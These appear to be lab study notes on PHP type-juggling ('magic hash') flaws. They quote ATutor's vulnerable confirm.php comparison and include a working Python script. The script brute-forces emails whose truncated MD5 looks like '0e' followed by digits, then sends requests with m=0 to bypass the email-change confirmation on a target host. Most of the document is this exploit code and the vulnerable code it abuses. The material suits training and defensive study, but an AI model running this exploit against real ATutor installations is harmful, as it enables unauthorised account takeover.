"""
(“7 puppies” == 7) -> True
(“Puppies” == 0) -> True

Bypasses Authentication Process

if ($_POST["password"] == "Admin_Password") {login_as_admin();}
    - (0 == “Admin_Password”) -> True

often this vuln will need to be combined with a deserialization flaw since post and get params are usually strings or arrays


https://github.com/spaze/hashes


http://localhost/atutorgit/confirm.php?id=18&m=3a4f4d38ba
gMQuIFVNof@gmail.com
substr(md5($e . $row['creation_date'] . $id), 0, 10);

var_dump(substr(md5('dlv@offsec.local'. '2016-03-10 16:00:00' . '1'), 0, 10))

works because the if statement compares our email which is hashed above to another var which is a string "0e77777777" == "asd" is true becasue 0 is treated like a number

if (isset($_GET['e'], $_GET['id'], $_GET['m'])) {
        $id = intval($_GET['id']);
        $m  = $_GET['m'];
        $e  = $addslashes($_GET['e']);

    $sql    = "SELECT creation_date FROM %smembers WHERE member_id=%d";
        $row = queryDB($sql, array(TABLE_PREFIX, $id), TRUE);

        if ($row['creation_date'] != '') {
                $code = substr(md5($e . $row['creation_date'] . $id), 0, 10);

                if ($code == $m) { <-VULN HERE
"""


import hashlib
import re
import random
import string
import requests
pattern = r'^0e[0-9]\d+$'
id = 1
def hash(email:str):
    hashed_str = email + '2016-03-10 16:00:00' + '1'
    return hashlib.md5(hashed_str.encode('utf-8')).hexdigest()[:11]

def gen_random_email():
    return (''.join(random.sample(string.ascii_letters, 10)) +'@offsec.local').lower()

def send_email_change_request(email:str) -> bool:
    url = f'http://192.168.206.103/ATutor/confirm.php?e={email}&m=0&id=1'
    response = requests.get(url, allow_redirects=False)
    print(url)
    if response.status_code == 302:
        return True
    return False

while(True):
    email = gen_random_email()
    hashe = (hash(email))
    if re.match(pattern, hashe):
        print(hashe)
        if is_sucess := send_email_change_request(email):
            break

